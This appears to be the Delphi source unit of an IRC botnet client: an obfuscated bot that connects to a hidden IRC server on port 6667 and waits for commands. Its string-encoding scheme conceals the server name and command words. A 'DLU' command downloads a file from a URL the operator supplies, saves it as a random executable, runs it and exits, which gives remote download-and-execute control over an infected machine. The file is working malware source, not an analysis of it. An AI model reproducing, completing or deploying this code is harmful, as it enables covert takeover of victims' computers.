unit Unit2;

interface

Uses Windows, Winsock, Unit1, ShellApi;

Var
 Str01   : string;
 IRCBOT  : TSocket;
 IRCInfo : SockAddr_In;
 WSADATA : TWSAData;
 BUF : Array[0..65536] of char;

 Procedure Start_Irc;
 FUNCTION IPstr(HostName:STRING) : STRING;
 function IntToStr(X: integer): string;
 Procedure Mssg(Str:String);
// !!ignore!!
 function DFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';
// !!ignore!!
implementation

function IntToStr(X: integer): string;
var
 S: string;
begin
 Str(X, S);
 Result := S;
end;

FUNCTION IPstr(HostName:STRING) : STRING;
LABEL Abort;
TYPE
  TAPInAddr = ARRAY[0..100] OF PInAddr;
  PAPInAddr =^TAPInAddr;
VAR
  WSAData    : TWSAData;
  HostEntPtr : PHostEnt;
  pptr       : PAPInAddr;
  I          : Integer;
BEGIN
  Result:='';
  WSAStartUp($101,WSAData);
  TRY
    HostEntPtr:=GetHostByName(PChar(HostName));
    IF HostEntPtr=NIL THEN GOTO Abort;
    pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
    I:=0;
    WHILE pptr^[I]<>NIL DO BEGIN
      IF HostName='' THEN BEGIN
        IF(Pos(decode('HlY'),inet_ntoa(pptr^[I]^))<>1)AND(Pos(decode('HYd'),inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
          Result:=inet_ntoa(pptr^[I]^);
          GOTO Abort;
        END;
      END ELSE
      RESULT:=(inet_ntoa(pptr^[I]^));
      Inc(I);
    END;
    Abort:
  EXCEPT
  END;
  WSACleanUp();
END;


Procedure ReadString;
Var                                     //To connect, type /QUOTE PONG
 Answer : String;
 F      : String;
Begin
 Str01 := '';
 Str01 := Buf;
 ZeroMemory(@Buf, SizeOf(Buf));
 sleep(10);
 If pos(decode('YeXWQBqWO1XY7Xueq'), Str01)>0 then begin
  Randomize;
  Answer := decode('rhwxXlq[')+IntToStr(Random(10))+IntToStr(Random(10))+IntToStr(Random(10))+IntToStr(Random(10))+IntToStr(Random(10))+']'+#13#10;
  Send(IRCBOT, Answer[1], Length(answer), 0);
 end;
 If Pos(decode('dJXaJ77qaS,XS1lqX/kR6dMXG6r3X'), Str01)>0 Then Begin
  Answer := Copy( Str01, Pos(decode('G6r3'),Str01) + 5, length(str01));
  Answer := Copy(Answer, 1, pos(#13#10, answer)-1);
  Answer := decode('kR6dMXG6r3X')+Answer+#13#10;
  Send( IRCBOT, ANSWER[1], Length(answer), 0);
 End;
 If POS(decode('Ghr3'), str01)>0 Then Begin
  Answer := Copy( Str01, Pos(decode('Ghr3'),Str01) + 6, length(str01));
  Answer := Copy(Answer, 1, pos(#13#10, answer)-1);
  Answer := decode('G6r3X:')+Answer+#13#10;
  Send( IRCBOT, ANSWER[1], Length(answer), 0);
 end;
 If POS(decode('.BWK'), str01)>0 Then Begin
  Answer := Copy( Str01, Pos(decode('.BWK'),Str01) + 5, length(str01));
  Answer := Copy(Answer, 1, pos(#13#10, answer)-1);
  Answer := Answer+#13#10;
  Send( IRCBOT, ANSWER[1], Length(answer), 0);
 end;
 If POS(decode('.|bR'), str01)>0 Then Begin      // DLU
  Answer := Copy( Str01, Pos(decode('.|bR'),Str01) + 5, length(str01));
  Answer := Copy( Answer, 1, Pos(#13#10, Answer)-1);
  If Copy(Answer,1,4) = decode('eS5u') then begin      // stfu
   Randomize;
   F := decode('lq')+inttostr(Random(9))+inttostr(Random(9))+inttostr(Random(9))+decode('.qmq');
   DFile(0, pChar(Copy(Answer, 6, Length(Answer))), pChar(F), 0, 0);
   ShellExecute(0, 'open', pChar(F), 0, 0, 1);
   ExitProcess(0);
  end;
 end;
 If POS(decode('P6d|'),str01)>0 then begin
  Answer := decode('U6hrX#PJ7cq1QJ9qXluBlQqsJ7cq1')+ #13#10;
  Send( IRCBOT, ANSWER[1], Length(answer), 0);
 end;
End;

Procedure Mssg(Str:String);
Begin
 Send(IRCBOT, STR[1], Length(Str), 0);
End;

Procedure Start_Irc;
Var
 Answer : String;
 label shut;
begin
shut:
   WSAStartup(257,WSAData);
   IrcInfo.sin_family:=PF_INET;
   IrcInfo.sin_port:=htons(6667);
   IrcInfo.sin_addr.S_addr:= inet_addr(PChar(ipstr(decode('uc.u7OqB7qS.JBH'))));
   IrcBot := socket(PF_INET,SOCK_STREAM,0);
   Connect(IrcBot,IrcInfo,sizeof(IrcInfo));

   Answer := decode('RCMZXSygXSyg@5JJ.yWBXSygXSyg')+#13#10;
   Send(IRCBOT, Answer[1], Length(answer), 0);
   Randomize;
   Answer := decode('rhwxXlq[')+IntToStr(Random(10))+IntToStr(Random(10))+IntToStr(Random(10))+IntToStr(Random(10))+IntToStr(Random(10))+']'+#13#10;
   Send(IRCBOT, Answer[1], Length(answer), 0);

 While 1<>2 do begin
  if (recv(IrcBot,buf,SizeOf(buf),0)) >= 1 then begin
   ReadString;
  end else goto shut;
 end;
end;

end.
 